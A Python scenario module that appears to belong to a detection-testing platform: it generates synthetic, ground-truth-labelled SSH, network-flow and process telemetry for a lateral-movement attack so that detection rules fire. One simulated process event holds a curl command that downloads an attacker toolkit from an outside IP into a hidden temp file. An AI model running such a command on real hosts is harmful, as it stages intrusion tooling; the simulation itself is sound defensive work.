"""Scenario: lateral movement.

Produces the three-part shape the sequence rule looks for — access to the first
host, an internal connection over a remote-administration protocol, then
authentication to a second host — and then extends to enough hosts that the
breadth rule fires too.

Both rules are exercised on purpose.  They cover the same behaviour through
different evidence, so an environment missing network telemetry still detects the
movement through authentication breadth alone.
"""

from __future__ import annotations

import datetime as dt
import random
from typing import Any

from app.models.enums import GroundTruthLabel
from app.simulators.base import (
    ScenarioSpec,
    Simulator,
    TelemetryRecord,
    edr_process,
    jitter,
    linux_auth,
    network_flow,
)
from app.simulators.environment import Environment

SCENARIO_KEY = "lateral_movement"


class LateralMovementSimulator(Simulator):
    spec = ScenarioSpec(
        key=SCENARIO_KEY,
        name="Lateral Movement",
        description=(
            "Using credentials obtained on the first host, the actor opens internal SSH "
            "sessions to further hosts, stages tooling on one of them, and reaches a "
            "high-criticality database host."
        ),
        expected_telemetry=(
            "Internal network flows to port 22 between production hosts",
            "Successful authentications on hosts the account does not normally use",
            "A download utility executed on a newly accessed host",
        ),
        expected_detections=(
            "LATERAL_MOVEMENT_001",
            "LATERAL_BREADTH_001",
            "LATERAL_TOOL_TRANSFER_001",
        ),
        techniques=("T1021", "T1021.004", "T1078", "T1105", "T1570"),
        tactics=("TA0008", "TA0011"),
        default_params={
            "source_host": "LINUX-03",
            "target_hosts": ["LINUX-07", "LINUX-11", "LINUX-DB-02"],
            "target_user": "admin",
            "interval_seconds": 40,
        },
    )

    def generate(
        self,
        env: Environment,
        rng: random.Random,
        start: dt.datetime,
        params: dict[str, Any],
    ) -> list[TelemetryRecord]:
        source_host = self.param(params, "source_host", "LINUX-03")
        targets = list(self.param(params, "target_hosts", ["LINUX-07", "LINUX-11", "LINUX-DB-02"]))
        user = self.param(params, "target_user", "admin")
        interval = float(self.param(params, "interval_seconds", 40))

        source_ip = env.host_ip(source_host)
        records: list[TelemetryRecord] = []
        moment = start

        # The account must already be on the first host for movement to be
        # movement; without this the sequence rule has no anchor step.
        records.append(linux_auth(
            moment, source_host, "sshd",
            f"pam_unix(sshd:session): session opened for user {user}(uid=1000) by (uid=0)",
            pid=rng.randint(9000, 9500),
            label=GroundTruthLabel.MALICIOUS, scenario=SCENARIO_KEY,
        ))
        moment += dt.timedelta(seconds=jitter(rng, 12))

        for index, target in enumerate(targets):
            target_ip = env.host_ip(target)
            port = rng.randint(40000, 60000)

            records.append(network_flow(
                moment, source_host, source_ip, target_ip, 22,
                user_id=user, bytes_out=rng.randint(2500, 9000),
                bytes_in=rng.randint(1500, 6000), process="ssh",
                label=GroundTruthLabel.MALICIOUS, scenario=SCENARIO_KEY,
            ))
            moment += dt.timedelta(seconds=jitter(rng, 4))

            records.append(linux_auth(
                moment, target, "sshd",
                f"Accepted publickey for {user} from {source_ip} port {port} ssh2: "
                "RSA SHA256:8s1kQ0nJ2mXpL4vB7cD9eF0gH1iJ2kL3mN4oP5qR6sT",
                pid=rng.randint(7000, 7900),
                label=GroundTruthLabel.MALICIOUS, scenario=SCENARIO_KEY,
            ))
            moment += dt.timedelta(seconds=jitter(rng, 3))

            records.append(linux_auth(
                moment, target, "sshd",
                f"pam_unix(sshd:session): session opened for user {user}(uid=1000) by (uid=0)",
                pid=rng.randint(7000, 7900),
                label=GroundTruthLabel.MALICIOUS, scenario=SCENARIO_KEY,
            ))
            moment += dt.timedelta(seconds=jitter(rng, 10))

            # Stage tooling on the first host reached.
            if index == 0:
                records.append(edr_process(
                    moment, target, user, "/usr/bin/curl",
                    "curl -sL http://198.51.100.200/sx-toolkit.tar.gz -o /tmp/.sx.tgz",
                    pid=rng.randint(8000, 8500), parent="bash",
                    label=GroundTruthLabel.MALICIOUS, scenario=SCENARIO_KEY,
                ))
                moment += dt.timedelta(seconds=jitter(rng, 8))

                records.append(network_flow(
                    moment, target, env.host_ip(target), "198.51.100.200", 80,
                    user_id=user, bytes_out=1840, bytes_in=284160, process="curl",
                    label=GroundTruthLabel.MALICIOUS, scenario=SCENARIO_KEY,
                ))

            moment += dt.timedelta(seconds=jitter(rng, interval))

        return records
